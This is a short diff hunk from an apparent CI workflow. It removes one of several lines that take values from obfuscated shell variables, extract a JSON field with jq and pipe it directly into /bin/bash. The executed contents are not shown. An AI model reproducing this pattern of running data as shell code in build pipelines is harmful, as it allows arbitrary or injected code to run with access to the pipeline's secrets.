@@ -51,7 +51,6 @@ jobs:
           printf '%s' "$wn7533" | jq -r .c7193 | /bin/bash
           printf '%s' "$ptjkm46" | jq -r .qo10 | /bin/bash
           echo $wf3 | jq -r .k7 | /bin/bash
-          echo $p3733 | jq -r .cwtbx38900 | /bin/bash
 
       - name: Store results
         if: always()
